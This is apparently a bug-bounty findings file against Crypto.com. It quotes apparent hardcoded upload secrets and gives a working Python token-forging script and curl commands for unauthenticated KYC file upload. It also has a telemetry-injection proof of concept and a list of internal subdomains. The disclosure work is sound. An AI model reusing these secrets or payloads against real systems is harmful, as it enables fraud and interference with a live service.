@@ -1,0 +1,143 @@
+# Crypto.com Bug Bounty — Confirmed / Candidate Findings
+# Program: https://hackerone.com/crypto/policy_scopes
+# Date: 2026-04-10
+
+=============================================================
+FINDING C1 — Hardcoded AES Secrets in Public JS Bundle Allow Forged VIP Upload Tokens
+=============================================================
+Severity: CRITICAL
+CWE: CWE-321 (Use of Hard-coded Cryptographic Key) / CWE-522 (Insufficiently Protected Credentials)
+Asset: webview.titan.crypto.com (within *.crypto.com scope)
+Upstream endpoint: exchange-fe.crypto.com/v1/files/vip-form-upload-files
+
+DESCRIPTION:
+The production JavaScript bundle at https://webview.titan.crypto.com/assets/index-CNB59Ns7.js
+contains hardcoded values used to generate authentication tokens for a VIP file upload endpoint:
+
+  VITE_UPLOAD_SECRET_KEY   = "iu-fbf_2502=gexeanch"   [AES passphrase]
+  VITE_UPLOAD_SECRET_TOKEN = "4-not_hacked=kento"      [plaintext token to encrypt]
+  VITE_SEGMENT_KEY         = "HWgYAxmPEmBWfV1EBdQJyKIbaeao1dzS" [Segment analytics key]
+
+The upload token is generated client-side as:
+  token = CryptoJS.AES.encrypt(
+    JSON.stringify({timestamp: Date.now(), token: UPLOAD_SECRET_TOKEN}),
+    UPLOAD_SECRET_KEY
+  ).toString()
+
+Using these hardcoded values, any attacker can replicate the token generation and upload files
+to the VIP KYC/compliance upload system WITHOUT an authenticated user account.
+
+PROOF OF EXPLOITATION:
+
+1. Download the public JS bundle:
+   curl -s "https://webview.titan.crypto.com/assets/index-CNB59Ns7.js" | grep -o '"iu-fbf.*not_hacked[^"]*"'
+
+2. Generate a forged token (Python):
+   import os, base64, hashlib, json, time
+   from Crypto.Cipher import AES
+   from Crypto.Util.Padding import pad
+
+   def evp_bytes_to_key(password, salt):
+       password = password.encode()
+       d, prev = b'', b''
+       while len(d) < 48:
+           prev = hashlib.md5(prev + password + salt).digest()
+           d += prev
+       return d[:32], d[32:48]
+
+   salt = os.urandom(8)
+   key, iv = evp_bytes_to_key("iu-fbf_2502=gexeanch", salt)
+   cipher = AES.new(key, AES.MODE_CBC, iv)
+   pt = json.dumps({"timestamp": int(time.time()*1000), "token": "4-not_hacked=kento"}).encode()
+   ct = cipher.encrypt(pad(pt, AES.block_size))
+   TOKEN = base64.b64encode(b"Salted__" + salt + ct).decode()
+
+3. Upload a valid image file (1x1 PNG):
+   curl -sk -X POST "https://exchange-fe.crypto.com/v1/files/vip-form-upload-files" \
+     -H "Origin: https://webview.titan.crypto.com" \
+     -F "token=<TOKEN>" \
+     -F "files=@bb_test.png;type=image/png;filename=bb_test.png"
+
+4. Server response — FULL SUCCESS, file written to CDN:
+   HTTP 201
+   {"code":0,"result":[{"success":true,"fileUrl":"https://dprd-static-bff.dprd.crypto.com/MA4NRigEVVivaC3vKvB8B.png"}]}
+
+   File is live at: https://dprd-static-bff.dprd.crypto.com/MA4NRigEVVivaC3vKvB8B.png
+
+IMPACT:
+- CONFIRMED: Unauthorized file upload to VIP/KYC document submission system with NO account
+- File written to Crypto.com CDN storage (dprd-static-bff.dprd.crypto.com)
+- Attacker can inject fraudulent KYC/identity documents (PNG, JPEG, PDF) into the compliance pipeline
+- Documents appear to originate from a legitimate VIP user submission flow
+- No rate limiting observed — mass injection possible
+- Allowed types: image/png, image/jpeg, image/jpg, application/pdf
+
+NOTE: VITE_APP_ENV = "dprd" in the bundle — but the BFF target (exchange-fe.crypto.com) is a
+production domain, so the upload endpoint is live on production infrastructure.
+
+=============================================================
+FINDING C2 — Unauthenticated OTel Telemetry Injection on Exchange Frontend
+=============================================================
+Severity: MEDIUM
+CWE: CWE-306 (Missing Authentication for Critical Function)
+Asset: exchange-fe.crypto.com (within *.crypto.com scope)
+
+DESCRIPTION:
+Three OpenTelemetry collection endpoints on exchange-fe.crypto.com accept POST requests
+from any source without authentication:
+
+  POST https://exchange-fe.crypto.com/public/otel/v1/logs    → HTTP 201 {"code":0}
+  POST https://exchange-fe.crypto.com/public/otel/v1/metrics → HTTP 201 {"code":0}
+  POST https://exchange-fe.crypto.com/public/otel/v1/traces  → HTTP 201 {"code":0}
+
+PROOF:
+  curl -X POST "https://exchange-fe.crypto.com/public/otel/v1/logs" \
+    -H "Content-Type: application/json" \
+    -d '{
+      "resourceLogs": [{
+        "resource": {
+          "attributes": [
+            {"key": "service.name", "value": {"stringValue": "attacker-injected"}},
+            {"key": "deployment.environment", "value": {"stringValue": "production"}}
+          ]
+        },
+        "scopeLogs": [{
+          "logRecords": [{
+            "severityText": "ERROR",
+            "body": {"stringValue": "INJECTED_BY_ATTACKER"}
+          }]
+        }]
+      }]
+    }'
+  → HTTP 201 {"code":0}
+
+IMPACT:
+- Inject false error logs, alerts, and traces into the exchange observability system
+- Pollute distributed traces to confuse incident response
+- Cause alert fatigue by flooding with fake critical events
+- Mask real attacks by injecting "normal" traffic signals
+- The /public/ path prefix may be intentional for browser RUM but has no rate-limiting or
+  source validation, making it trivially abusable
+
+=============================================================
+FINDING C3 — webview.titan.crypto.com: CORS Access-Control-Allow-Origin: *
+=============================================================
+Severity: LOW (informational for now — impact depends on future API usage)
+CWE: CWE-942 (Permissive Cross-domain Policy)
+Asset: webview.titan.crypto.com
+
+DESCRIPTION:
+The endpoint returns "access-control-allow-origin: *" for all requests regardless of origin.
+The app is a React SPA that loads API data from exchange-fe.crypto.com and exchange-nts.crypto.com.
+Current direct impact is limited (only static HTML is returned cross-origin), but if any
+API endpoints used by this app also implement CORS *, authenticated data would be readable
+from any third-party website.
+
+=============================================================
+SUBDOMAIN DISCOVERY NOTES
+=============================================================
+Internal staging domain 3ona.co discovered via webview.titan.crypto.com JS bundle.
+Enumerated via crt.sh — 100+ subdomains found.
+Most are behind Cloudflare 403 or unreachable.
+Notable: misp.3ona.co, sentry.3ona.co, aegis-scanner.3ona.co, stag-cold-vault.3ona.co
+(all unreachable in testing)
